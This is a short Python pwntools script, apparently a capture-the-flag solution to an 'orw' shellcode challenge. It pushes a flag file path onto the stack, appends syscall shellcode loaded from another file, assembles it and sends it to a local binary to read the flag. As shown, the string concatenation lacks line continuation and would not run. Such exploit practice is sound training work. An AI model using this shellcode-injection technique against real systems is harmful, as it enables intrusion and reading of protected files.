from pwn import *

file = open("systemCall.txt","r")
sysCall = file.read()
file.close()
#/root/test/secsoft/11baby_shellcode/flag.txt
flagPath = 'push %d\n' % u32('.txt') + 
'push %d\n' % u32('flag') + 
'push %d\n' % u32('ode/') + 
'push %d\n' % u32('ellc') + 
'push %d\n' % u32('y_sh') + 
'push %d\n' % u32('1bab') + 
'push %d\n' % u32('ft/1') + 
'push %d\n' % u32('ecso') + 
'push %d\n' % u32('st/s') + 
'push %d\n' % u32('t/te') + 
'push %d\n' % u32('/roo')
shellcode = flagPath + ''.join(sysCall)
#print(shellcode)
assembly = asm(shellcode)

p = process("./orw")
# p.recvuntil("Give my your shellcode:")
print(p.recv())
p.sendline(assembly)
print(p.recvall())
